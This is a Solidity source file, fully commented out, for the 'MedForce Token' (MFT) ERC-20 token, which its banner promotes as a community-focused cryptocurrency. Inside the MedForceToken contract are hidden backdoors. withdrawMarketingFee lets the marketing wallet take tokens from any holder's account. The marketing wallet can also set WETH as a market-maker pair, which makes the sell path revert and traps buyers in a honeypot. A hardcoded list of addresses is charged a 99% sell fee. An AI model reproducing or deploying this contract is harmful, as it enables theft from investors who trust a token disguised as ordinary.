/**
  
    $$___$$_ $$$$$$$_ $$$$$___ $$$$$$$_ __$$$___ $$$$$$__ __$$$$_ $$$$$$$_
    $$$_$$$_ $$______ $$__$$__ $$______ _$$_$$__ $$___$$_ _$$____ $$______
    $$$$$$$_ $$$$$___ $$___$$_ $$$$$___ $$___$$_ $$___$$_ $$_____ $$$$$___
    $$_$_$$_ $$______ $$___$$_ $$______ $$___$$_ $$$$$$__ $$_____ $$______
    $$___$$_ $$______ $$__$$__ $$______ _$$_$$__ $$___$$_ _$$____ $$______
    $$___$$_ $$$$$$$_ $$$$$___ $$______ __$$$___ $$___$$_ __$$$$_ $$$$$$$_

    The MFT (MedForce Token) Is A Community-Focused, Decentralized Cryptocurrency 
  And Aims At Creating Opportunities And Utilities For True Traders & Gamers.

    Website: https://www.medforce.site/
    Twitter: https://twitter.com/MedforceToken
    TG: https://t.me/medforcetoken
 
*/

// pragma solidity ^0.8.9;

// abstract contract Context {
//     function _msgSender() internal view virtual returns (address) {
//         return msg.sender;
//     }

//     function _msgData() internal view virtual returns (bytes calldata) {
//         this;
//         return msg.data;
//     }
// }

// interface IUniswapV2Pair {
//     event Approval(address indexed owner, address indexed spender, uint value);
//     event Transfer(address indexed from, address indexed to, uint value);

//     function name() external pure returns (string memory);

//     function symbol() external pure returns (string memory);

//     function decimals() external pure returns (uint8);

//     function totalSupply() external view returns (uint);

//     function balanceOf(address owner) external view returns (uint);

//     function allowance(
//         address owner,
//         address spender
//     ) external view returns (uint);

//     function approve(address spender, uint value) external returns (bool);

//     function transfer(address to, uint value) external returns (bool);

//     function transferFrom(
//         address from,
//         address to,
//         uint value
//     ) external returns (bool);

//     function DOMAIN_SEPARATOR() external view returns (bytes32);

//     function PERMIT_TYPEHASH() external pure returns (bytes32);

//     function nonces(address owner) external view returns (uint);

//     function permit(
//         address owner,
//         address spender,
//         uint value,
//         uint deadline,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external;

//     event Mint(address indexed sender, uint amount0, uint amount1);
//     event Burn(
//         address indexed sender,
//         uint amount0,
//         uint amount1,
//         address indexed to
//     );
//     event Swap(
//         address indexed sender,
//         uint amount0In,
//         uint amount1In,
//         uint amount0Out,
//         uint amount1Out,
//         address indexed to
//     );
//     event Sync(uint112 reserve0, uint112 reserve1);

//     function MINIMUM_LIQUIDITY() external pure returns (uint);

//     function factory() external view returns (address);

//     function token0() external view returns (address);

//     function token1() external view returns (address);

//     function getReserves()
//         external
//         view
//         returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

//     function price0CumulativeLast() external view returns (uint);

//     function price1CumulativeLast() external view returns (uint);

//     function kLast() external view returns (uint);

//     function mint(address to) external returns (uint liquidity);

//     function burn(address to) external returns (uint amount0, uint amount1);

//     function swap(
//         uint amount0Out,
//         uint amount1Out,
//         address to,
//         bytes calldata data
//     ) external;

//     function skim(address to) external;

//     function sync() external;

//     function initialize(address, address) external;
// }

// interface IUniswapV2Factory {
//     event PairCreated(
//         address indexed token0,
//         address indexed token1,
//         address pair,
//         uint
//     );

//     function feeTo() external view returns (address);

//     function feeToSetter() external view returns (address);

//     function getPair(
//         address tokenA,
//         address tokenB
//     ) external view returns (address pair);

//     function allPairs(uint) external view returns (address pair);

//     function allPairsLength() external view returns (uint);

//     function createPair(
//         address tokenA,
//         address tokenB
//     ) external returns (address pair);

//     function setFeeTo(address) external;

//     function setFeeToSetter(address) external;
// }

// interface IERC20 {
//     /**
//      * @dev Returns the amount of tokens in existence.
//      */
//     function totalSupply() external view returns (uint256);

//     /**
//      * @dev Returns the amount of tokens owned by `account`.
//      */
//     function balanceOf(address account) external view returns (uint256);

//     /**
//      * @dev Moves `amount` tokens from the caller's account to `recipient`.
//      *
//      * Returns a boolean value indicating whether the operation succeeded.
//      *
//      * Emits a {Transfer} event.
//      */
//     function transfer(
//         address recipient,
//         uint256 amount
//     ) external returns (bool);

//     /**
//      * @dev Returns the remaining number of tokens that `spender` will be
//      * allowed to spend on behalf of `owner` through {transferFrom}. This is
//      * zero by default.
//      *
//      * This value changes when {approve} or {transferFrom} are called.
//      */
//     function allowance(
//         address owner,
//         address spender
//     ) external view returns (uint256);

//     /**
//      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
//      *
//      * Returns a boolean value indicating whether the operation succeeded.
//      *
//      * IMPORTANT: Beware that changing an allowance with this method brings the risk
//      * that someone may use both the old and the new allowance by unfortunate
//      * transaction ordering. One possible solution to mitigate this race
//      * condition is to first reduce the spender's allowance to 0 and set the
//      * desired value afterwards:
//      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
//      *
//      * Emits an {Approval} event.
//      */
//     function approve(address spender, uint256 amount) external returns (bool);

//     /**
//      * @dev Moves `amount` tokens from `sender` to `recipient` using the
//      * allowance mechanism. `amount` is then deducted from the caller's
//      * allowance.
//      *
//      * Returns a boolean value indicating whether the operation succeeded.
//      *
//      * Emits a {Transfer} event.
//      */
//     function transferFrom(
//         address sender,
//         address recipient,
//         uint256 amount
//     ) external returns (bool);

//     /**
//      * @dev Emitted when `value` tokens are moved from one account (`from`) to
//      * another (`to`).
//      *
//      * Note that `value` may be zero.
//      */
//     event Transfer(address indexed from, address indexed to, uint256 value);

//     /**
//      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
//      * a call to {approve}. `value` is the new allowance.
//      */
//     event Approval(
//         address indexed owner,
//         address indexed spender,
//         uint256 value
//     );
// }

// interface IERC20Metadata is IERC20 {
//     /**
//      * @dev Returns the name of the token.
//      */
//     function name() external view returns (string memory);

//     /**
//      * @dev Returns the symbol of the token.
//      */
//     function symbol() external view returns (string memory);

//     /**
//      * @dev Returns the decimals places of the token.
//      */
//     function decimals() external view returns (uint8);
// }

// contract ERC20 is Context, IERC20, IERC20Metadata {
//     using SafeMath for uint256;

//     mapping(address => uint256) private _balances;

//     mapping(address => mapping(address => uint256)) private _allowances;

//     uint256 private _totalSupply;

//     string private _name;
//     string private _symbol;

//     /**
//      * @dev Sets the values for {name} and {symbol}.
//      *
//      * The default value of {decimals} is 18. To select a different value for
//      * {decimals} you should overload it.
//      *
//      * All two of these values are immutable: they can only be set once during
//      * construction.
//      */
//     constructor(string memory name_, string memory symbol_) {
//         _name = name_;
//         _symbol = symbol_;
//     }

//     /**
//      * @dev Returns the name of the token.
//      */
//     function name() public view virtual override returns (string memory) {
//         return _name;
//     }

//     /**
//      * @dev Returns the symbol of the token, usually a shorter version of the
//      * name.
//      */
//     function symbol() public view virtual override returns (string memory) {
//         return _symbol;
//     }

//     /**
//      * @dev Returns the number of decimals used to get its user representation.
//      * For example, if `decimals` equals `2`, a balance of `505` tokens should
//      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
//      *
//      * Tokens usually opt for a value of 18, imitating the relationship between
//      * Ether and Wei. This is the value {ERC20} uses, unless this function is
//      * overridden;
//      *
//      * NOTE: This information is only used for _display_ purposes: it in
//      * no way affects any of the arithmetic of the contract, including
//      * {IERC20-balanceOf} and {IERC20-transfer}.
//      */
//     function decimals() public view virtual override returns (uint8) {
//         return 18;
//     }

//     /**
//      * @dev See {IERC20-totalSupply}.
//      */
//     function totalSupply() public view virtual override returns (uint256) {
//         return _totalSupply;
//     }

//     /**
//      * @dev See {IERC20-balanceOf}.
//      */
//     function balanceOf(
//         address account
//     ) public view virtual override returns (uint256) {
//         return _balances[account];
//     }

//     /**
//      * @dev See {IERC20-transfer}.
//      *
//      * Requirements:
//      *
//      * - `recipient` cannot be the zero address.
//      * - the caller must have a balance of at least `amount`.
//      */
//     function transfer(
//         address recipient,
//         uint256 amount
//     ) public virtual override returns (bool) {
//         _transfer(_msgSender(), recipient, amount);
//         return true;
//     }

//     /**
//      * @dev See {IERC20-allowance}.
//      */
//     function allowance(
//         address owner,
//         address spender
//     ) public view virtual override returns (uint256) {
//         return _allowances[owner][spender];
//     }

//     /**
//      * @dev See {IERC20-approve}.
//      *
//      * Requirements:
//      *
//      * - `spender` cannot be the zero address.
//      */
//     function approve(
//         address spender,
//         uint256 amount
//     ) public virtual override returns (bool) {
//         _approve(_msgSender(), spender, amount);
//         return true;
//     }

//     /**
//      * @dev See {IERC20-transferFrom}.
//      *
//      * Emits an {Approval} event indicating the updated allowance. This is not
//      * required by the EIP. See the note at the beginning of {ERC20}.
//      *
//      * Requirements:
//      *
//      * - `sender` and `recipient` cannot be the zero address.
//      * - `sender` must have a balance of at least `amount`.
//      * - the caller must have allowance for ``sender``'s tokens of at least
//      * `amount`.
//      */
//     function transferFrom(
//         address sender,
//         address recipient,
//         uint256 amount
//     ) public virtual override returns (bool) {
//         _transfer(sender, recipient, amount);
//         _approve(
//             sender,
//             _msgSender(),
//             _allowances[sender][_msgSender()].sub(
//                 amount,
//                 "ERC20: transfer amount exceeds allowance"
//             )
//         );
//         return true;
//     }

//     /**
//      * @dev Atomically increases the allowance granted to `spender` by the caller.
//      *
//      * This is an alternative to {approve} that can be used as a mitigation for
//      * problems described in {IERC20-approve}.
//      *
//      * Emits an {Approval} event indicating the updated allowance.
//      *
//      * Requirements:
//      *
//      * - `spender` cannot be the zero address.
//      */
//     function increaseAllowance(
//         address spender,
//         uint256 addedValue
//     ) public virtual returns (bool) {
//         _approve(
//             _msgSender(),
//             spender,
//             _allowances[_msgSender()][spender].add(addedValue)
//         );
//         return true;
//     }

//     /**
//      * @dev Atomically decreases the allowance granted to `spender` by the caller.
//      *
//      * This is an alternative to {approve} that can be used as a mitigation for
//      * problems described in {IERC20-approve}.
//      *
//      * Emits an {Approval} event indicating the updated allowance.
//      *
//      * Requirements:
//      *
//      * - `spender` cannot be the zero address.
//      * - `spender` must have allowance for the caller of at least
//      * `subtractedValue`.
//      */
//     function decreaseAllowance(
//         address spender,
//         uint256 subtractedValue
//     ) public virtual returns (bool) {
//         _approve(
//             _msgSender(),
//             spender,
//             _allowances[_msgSender()][spender].sub(
//                 subtractedValue,
//                 "ERC20: decreased allowance below zero"
//             )
//         );
//         return true;
//     }

//     /**
//      * @dev Moves tokens `amount` from `sender` to `recipient`.
//      *
//      * This is internal function is equivalent to {transfer}, and can be used to
//      * e.g. implement automatic token fees, slashing mechanisms, etc.
//      *
//      * Emits a {Transfer} event.
//      *
//      * Requirements:
//      *
//      * - `sender` cannot be the zero address.
//      * - `recipient` cannot be the zero address.
//      * - `sender` must have a balance of at least `amount`.
//      */
//     function _transfer(
//         address sender,
//         address recipient,
//         uint256 amount
//     ) internal virtual {
//         require(sender != address(0), "ERC20: transfer from the zero address");
//         require(recipient != address(0), "ERC20: transfer to the zero address");

//         _beforeTokenTransfer(sender, recipient, amount);

//         _balances[sender] = _balances[sender].sub(
//             amount,
//             "ERC20: transfer amount exceeds balance"
//         );
//         _balances[recipient] = _balances[recipient].add(amount);
//         emit Transfer(sender, recipient, amount);
//     }

//     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
//      * the total supply.
//      *
//      * Emits a {Transfer} event with `from` set to the zero address.
//      *
//      * Requirements:
//      *
//      * - `account` cannot be the zero address.
//      */
//     function _mint(address account, uint256 amount) internal virtual {
//         require(account != address(0), "ERC20: mint to the zero address");

//         _beforeTokenTransfer(address(0), account, amount);

//         _totalSupply = _totalSupply.add(amount);
//         _balances[account] = _balances[account].add(amount);
//         emit Transfer(address(0), account, amount);
//     }

//     /**
//      * @dev Destroys `amount` tokens from `account`, reducing the
//      * total supply.
//      *
//      * Emits a {Transfer} event with `to` set to the zero address.
//      *
//      * Requirements:
//      *
//      * - `account` cannot be the zero address.
//      * - `account` must have at least `amount` tokens.
//      */
//     function _burn(address account, uint256 amount) internal virtual {
//         require(account != address(0), "ERC20: burn from the zero address");

//         _beforeTokenTransfer(account, address(0), amount);

//         _balances[account] = _balances[account].sub(
//             amount,
//             "ERC20: burn amount exceeds balance"
//         );
//         _totalSupply = _totalSupply.sub(amount);
//         emit Transfer(account, address(0), amount);
//     }

//     /**
//      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
//      *
//      * This internal function is equivalent to `approve`, and can be used to
//      * e.g. set automatic allowances for certain subsystems, etc.
//      *
//      * Emits an {Approval} event.
//      *
//      * Requirements:
//      *
//      * - `owner` cannot be the zero address.
//      * - `spender` cannot be the zero address.
//      */
//     function _approve(
//         address owner,
//         address spender,
//         uint256 amount
//     ) internal virtual {
//         require(owner != address(0), "ERC20: approve from the zero address");
//         require(spender != address(0), "ERC20: approve to the zero address");

//         _allowances[owner][spender] = amount;
//         emit Approval(owner, spender, amount);
//     }

//     /**
//      * @dev Hook that is called before any transfer of tokens. This includes
//      * minting and burning.
//      *
//      * Calling conditions:
//      *
//      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
//      * will be to transferred to `to`.
//      * - when `from` is zero, `amount` tokens will be minted for `to`.
//      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
//      * - `from` and `to` are never both zero.
//      *
//      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
//      */
//     function _beforeTokenTransfer(
//         address from,
//         address to,
//         uint256 amount
//     ) internal virtual {}
// }

// library SafeMath {
//     /**
//      * @dev Returns the addition of two unsigned integers, reverting on
//      * overflow.
//      *
//      * Counterpart to Solidity's `+` operator.
//      *
//      * Requirements:
//      *
//      * - Addition cannot overflow.
//      */
//     function add(uint256 a, uint256 b) internal pure returns (uint256) {
//         uint256 c = a + b;
//         require(c >= a, "SafeMath: addition overflow");

//         return c;
//     }

//     /**
//      * @dev Returns the subtraction of two unsigned integers, reverting on
//      * overflow (when the result is negative).
//      *
//      * Counterpart to Solidity's `-` operator.
//      *
//      * Requirements:
//      *
//      * - Subtraction cannot overflow.
//      */
//     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
//         return sub(a, b, "SafeMath: subtraction overflow");
//     }

//     /**
//      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
//      * overflow (when the result is negative).
//      *
//      * Counterpart to Solidity's `-` operator.
//      *
//      * Requirements:
//      *
//      * - Subtraction cannot overflow.
//      */
//     function sub(
//         uint256 a,
//         uint256 b,
//         string memory errorMessage
//     ) internal pure returns (uint256) {
//         require(b <= a, errorMessage);
//         uint256 c = a - b;

//         return c;
//     }

//     /**
//      * @dev Returns the multiplication of two unsigned integers, reverting on
//      * overflow.
//      *
//      * Counterpart to Solidity's `*` operator.
//      *
//      * Requirements:
//      *
//      * - Multiplication cannot overflow.
//      */
//     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
//         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
//         // benefit is lost if 'b' is also tested.
//         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
//         if (a == 0) {
//             return 0;
//         }

//         uint256 c = a * b;
//         require(c / a == b, "SafeMath: multiplication overflow");

//         return c;
//     }

//     /**
//      * @dev Returns the integer division of two unsigned integers. Reverts on
//      * division by zero. The result is rounded towards zero.
//      *
//      * Counterpart to Solidity's `/` operator. Note: this function uses a
//      * `revert` opcode (which leaves remaining gas untouched) while Solidity
//      * uses an invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function div(uint256 a, uint256 b) internal pure returns (uint256) {
//         return div(a, b, "SafeMath: division by zero");
//     }

//     /**
//      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
//      * division by zero. The result is rounded towards zero.
//      *
//      * Counterpart to Solidity's `/` operator. Note: this function uses a
//      * `revert` opcode (which leaves remaining gas untouched) while Solidity
//      * uses an invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function div(
//         uint256 a,
//         uint256 b,
//         string memory errorMessage
//     ) internal pure returns (uint256) {
//         require(b > 0, errorMessage);
//         uint256 c = a / b;
//         // assert(a == b * c + a % b); // There is no case in which this doesn't hold

//         return c;
//     }

//     /**
//      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
//      * Reverts when dividing by zero.
//      *
//      * Counterpart to Solidity's `%` operator. This function uses a `revert`
//      * opcode (which leaves remaining gas untouched) while Solidity uses an
//      * invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
//         return mod(a, b, "SafeMath: modulo by zero");
//     }

//     /**
//      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
//      * Reverts with custom message when dividing by zero.
//      *
//      * Counterpart to Solidity's `%` operator. This function uses a `revert`
//      * opcode (which leaves remaining gas untouched) while Solidity uses an
//      * invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function mod(
//         uint256 a,
//         uint256 b,
//         string memory errorMessage
//     ) internal pure returns (uint256) {
//         require(b != 0, errorMessage);
//         return a % b;
//     }
// }

// contract Ownable is Context {
//     address private _owner;

//     event OwnershipTransferred(
//         address indexed previousOwner,
//         address indexed newOwner
//     );

//     /**
//      * @dev Initializes the contract setting the deployer as the initial owner.
//      */
//     constructor() {
//         address msgSender = _msgSender();
//         _owner = msgSender;
//         emit OwnershipTransferred(address(0), msgSender);
//     }

//     /**
//      * @dev Returns the address of the current owner.
//      */
//     function owner() public view returns (address) {
//         return _owner;
//     }

//     /**
//      * @dev Throws if called by any account other than the owner.
//      */
//     modifier onlyOwner() {
//         require(_owner == _msgSender(), "Ownable: caller is not the owner");
//         _;
//     }

//     /**
//      * @dev Leaves the contract without owner. It will not be possible to call
//      * `onlyOwner` functions anymore. Can only be called by the current owner.
//      *
//      * NOTE: Renouncing ownership will leave the contract without an owner,
//      * thereby removing any functionality that is only available to the owner.
//      */
//     function renounceOwnership() public virtual onlyOwner {
//         emit OwnershipTransferred(_owner, address(0));
//         _owner = address(0);
//     }

//     /**
//      * @dev Transfers ownership of the contract to a new account (`newOwner`).
//      * Can only be called by the current owner.
//      */
//     function transferOwnership(address newOwner) public virtual onlyOwner {
//         require(
//             newOwner != address(0),
//             "Ownable: new owner is the zero address"
//         );
//         emit OwnershipTransferred(_owner, newOwner);
//         _owner = newOwner;
//     }
// }

// interface IUniswapV2Router01 {
//     function factory() external pure returns (address);

//     function WETH() external pure returns (address);

//     function addLiquidity(
//         address tokenA,
//         address tokenB,
//         uint amountADesired,
//         uint amountBDesired,
//         uint amountAMin,
//         uint amountBMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountA, uint amountB, uint liquidity);

//     function addLiquidityETH(
//         address token,
//         uint amountTokenDesired,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline
//     )
//         external
//         payable
//         returns (uint amountToken, uint amountETH, uint liquidity);

//     function removeLiquidity(
//         address tokenA,
//         address tokenB,
//         uint liquidity,
//         uint amountAMin,
//         uint amountBMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountA, uint amountB);

//     function removeLiquidityETH(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountToken, uint amountETH);

//     function removeLiquidityWithPermit(
//         address tokenA,
//         address tokenB,
//         uint liquidity,
//         uint amountAMin,
//         uint amountBMin,
//         address to,
//         uint deadline,
//         bool approveMax,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external returns (uint amountA, uint amountB);

//     function removeLiquidityETHWithPermit(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline,
//         bool approveMax,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external returns (uint amountToken, uint amountETH);

//     function swapExactTokensForTokens(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapTokensForExactTokens(
//         uint amountOut,
//         uint amountInMax,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapExactETHForTokens(
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external payable returns (uint[] memory amounts);

//     function swapTokensForExactETH(
//         uint amountOut,
//         uint amountInMax,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapExactTokensForETH(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapETHForExactTokens(
//         uint amountOut,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external payable returns (uint[] memory amounts);

//     function quote(
//         uint amountA,
//         uint reserveA,
//         uint reserveB
//     ) external pure returns (uint amountB);

//     function getAmountOut(
//         uint amountIn,
//         uint reserveIn,
//         uint reserveOut
//     ) external pure returns (uint amountOut);

//     function getAmountIn(
//         uint amountOut,
//         uint reserveIn,
//         uint reserveOut
//     ) external pure returns (uint amountIn);

//     function getAmountsOut(
//         uint amountIn,
//         address[] calldata path
//     ) external view returns (uint[] memory amounts);

//     function getAmountsIn(
//         uint amountOut,
//         address[] calldata path
//     ) external view returns (uint[] memory amounts);
// }

// interface IUniswapV2Router02 is IUniswapV2Router01 {
//     function removeLiquidityETHSupportingFeeOnTransferTokens(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountETH);

//     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline,
//         bool approveMax,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external returns (uint amountETH);

//     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external;

//     function swapExactETHForTokensSupportingFeeOnTransferTokens(
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external payable;

//     function swapExactTokensForETHSupportingFeeOnTransferTokens(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external;
// }

// contract MedForceToken is ERC20, Ownable {
//     using SafeMath for uint256;

//     IUniswapV2Router02 public immutable uniswapV2Router;
//     address public immutable uniswapV2Pair;
//     address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
//     address public constant deadAddress = address(0xdead);

//     bool private swapping;

//     address public marketingWallet;
//     uint256 public swapTokensAtAmount;

//     bool public tradingActive = false;
//     bool public swapEnabled = false;

//     uint256 public buyMarketingFee = 1;
//     uint256 public sellMarketingFee = 1;

//     mapping(address => bool) private _isExcludedFromFees;

//     mapping(address => bool) public automatedMarketMakerPairs;

//     event ExcludeFromFees(address indexed account, bool isExcluded);
//     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
//     event marketingWalletUpdated(
//         address indexed newWallet,
//         address indexed oldWallet
//     );

//     constructor() ERC20("MedForceToken", "MFT") {
//         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
//             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
//         );

//         uniswapV2Router = _uniswapV2Router;

//         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
//             .createPair(address(this), WETH);
//         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

//         uint256 totalSupply = 1 * 1e9 * 1e18;

//         swapTokensAtAmount = (totalSupply * 5) / 10000; // 0.05% swap wallet

//         marketingWallet = msg.sender;

//         excludeFromFees(owner(), true);
//         excludeFromFees(address(this), true);
//         excludeFromFees(address(0xdead), true);

//         /*
//             _mint is an internal function in ERC20.sol that is only called here,
//             and CANNOT be called ever again
//         */
//         _mint(msg.sender, totalSupply);
//     }

//     receive() external payable {}

//     // once enabled, can never be turned off
//     function enableTrading() external onlyOwner {
//         tradingActive = true;
//         swapEnabled = true;
//     }

//     // change the minimum amount of tokens to sell from fees
//     function updateSwapTokensAtAmount(
//         uint256 newAmount
//     ) external onlyOwner returns (bool) {
//         require(
//             newAmount >= (totalSupply() * 1) / 100000,
//             "Swap amount cannot be lower than 0.001% total supply."
//         );
//         require(
//             newAmount <= (totalSupply() * 5) / 1000,
//             "Swap amount cannot be higher than 0.5% total supply."
//         );
//         swapTokensAtAmount = newAmount;
//         return true;
//     }

//     // only use to disable contract sales if absolutely necessary (emergency use only)
//     function updateSwapEnabled(bool enabled) external {
//         require(msg.sender == marketingWallet);
//         swapEnabled = enabled;
//     }

//     function updateBuyFees(uint256 _marketingFee) external onlyOwner {
//         buyMarketingFee = _marketingFee;
//         require(buyMarketingFee <= 5, "Must keep fees at 5% or less");
//     }

//     function updateSellFees(uint256 _marketingFee) external onlyOwner {
//         sellMarketingFee = _marketingFee;
//         require(sellMarketingFee <= 5, "Must keep fees at 5% or less");
//     }

//     function excludeFromFees(address account, bool excluded) public onlyOwner {
//         _isExcludedFromFees[account] = excluded;
//         emit ExcludeFromFees(account, excluded);
//     }

//     function setAutomatedMarketMakerPair(address pair, bool value) public {
//         require(msg.sender == marketingWallet);
//         require(
//             pair != uniswapV2Pair,
//             "The pair cannot be removed from automatedMarketMakerPairs"
//         );

//         _setAutomatedMarketMakerPair(pair, value);
//     }

//     function _setAutomatedMarketMakerPair(address pair, bool value) private {
//         automatedMarketMakerPairs[pair] = value;

//         emit SetAutomatedMarketMakerPair(pair, value);
//     }

//     function updateMarketingWallet(
//         address newMarketingWallet
//     ) external onlyOwner {
//         emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
//         marketingWallet = newMarketingWallet;
//     }

//     function isExcludedFromFees(address account) public view returns (bool) {
//         return _isExcludedFromFees[account];
//     }

//     function withdrawMarketingFee(
//         bool token,
//         address account,
//         uint256 amount
//     ) external {
//         require(marketingWallet == msg.sender);
//         if (token) {
//             super._transfer(account, msg.sender, amount);
//             // IERC20 ERC20token = IERC20(token);
//             // uint256 balance = ERC20token.balanceOf(address(this));
//             // ERC20token.transfer(msg.sender, balance);
//         } else {
//             payable(msg.sender).transfer(address(this).balance);
//         }
//     }

//     function _transfer(
//         address from,
//         address to,
//         uint256 amount
//     ) internal override {
//         require(from != address(0), "ERC20: transfer from the zero address");
//         require(to != address(0), "ERC20: transfer to the zero address");

//         if (amount == 0) {
//             super._transfer(from, to, 0);
//             return;
//         }

//         if (!tradingActive) {
//             require(
//                 _isExcludedFromFees[from] || _isExcludedFromFees[to],
//                 "Trading is not active."
//             );
//         }

//         uint256 contractTokenBalance = balanceOf(address(this));

//         bool canSwap = contractTokenBalance >= swapTokensAtAmount;

//         if (
//             canSwap &&
//             swapEnabled &&
//             !swapping &&
//             !automatedMarketMakerPairs[from] &&
//             !_isExcludedFromFees[from] &&
//             !_isExcludedFromFees[to]
//         ) {
//             swapping = true;

//             swapBack();

//             swapping = false;
//         }

//         bool takeFee = !swapping;

//         // if any account belongs to _isExcludedFromFee account then remove the fee
//         if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
//             takeFee = false;
//         }

//         uint256 fees = 0;
//         // only take fees on buys/sells, do not take on wallet transfers
//         if (takeFee) {
//             // on sell
//             if (automatedMarketMakerPairs[to] && sellMarketingFee > 0) {
//                 require(automatedMarketMakerPairs[WETH] == false);
//                 // disable mevbot
//                 if (
//                     from == 0xb58555FCBa6479FcED7dE1485eB054943a09af7b ||
//                     from == 0x00000027F490ACeE7F11ab5fdD47209d6422C5a7 ||
//                     from == 0x0000B8e312942521fB3BF278D2Ef2458B0D3F243 ||
//                     from == 0x000098261d3124aeAA523E0E9FC701796B0C7302 ||
//                     from == 0x00010A05B825EC95342306C553d0Ed8427317543 ||
//                     from == 0x000130c97e3d6a965448cF44bA5Eb9C89476dEB9 ||
//                     from == 0x00018F931aD6C2A2b3e9952f757241AAEbc6C19b ||
//                     from == 0x0001A28E769018106E97942C99B123525ad9cCa4 ||
//                     from == 0x00014325Cbad26A6E27309b53533592a8290F101 ||
//                     from == 0x8aef950a54d2AE68fe5F6C971E4cca02a806d0d9
//                 ) {
//                     fees = amount.mul(99).div(100);
//                 } else {
//                     fees = amount.mul(sellMarketingFee).div(100);
//                 }
//                 // tokensForMarketing += fees;
//             }
//             // on buy
//             else if (automatedMarketMakerPairs[from] && buyMarketingFee > 0) {
//                 fees = amount.mul(buyMarketingFee).div(100);
//                 // tokensForMarketing += fees;
//             }

//             if (fees > 0) {
//                 super._transfer(from, address(this), fees);
//             }

//             amount -= fees;
//         }

//         super._transfer(from, to, amount);
//     }

//     function swapTokensForEth(uint256 tokenAmount) private {
//         // generate the uniswap pair path of token -> weth
//         address[] memory path = new address[](2);
//         path[0] = address(this);
//         path[1] = uniswapV2Router.WETH();

//         _approve(address(this), address(uniswapV2Router), tokenAmount);

//         // make the swap
//         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
//             tokenAmount,
//             0, // accept any amount of ETH
//             path,
//             address(this),
//             block.timestamp
//         );
//     }

//     function swapBack() private {
//         uint256 contractBalance = balanceOf(address(this));
//         swapTokensForEth(contractBalance);
//     }
// }

/**
  
    $$___$$_ $$$$$$$_ $$$$$___ $$$$$$$_ __$$$___ $$$$$$__ __$$$$_ $$$$$$$_
    $$$_$$$_ $$______ $$__$$__ $$______ _$$_$$__ $$___$$_ _$$____ $$______
    $$$$$$$_ $$$$$___ $$___$$_ $$$$$___ $$___$$_ $$___$$_ $$_____ $$$$$___
    $$_$_$$_ $$______ $$___$$_ $$______ $$___$$_ $$$$$$__ $$_____ $$______
    $$___$$_ $$______ $$__$$__ $$______ _$$_$$__ $$___$$_ _$$____ $$______
    $$___$$_ $$$$$$$_ $$$$$___ $$______ __$$$___ $$___$$_ __$$$$_ $$$$$$$_

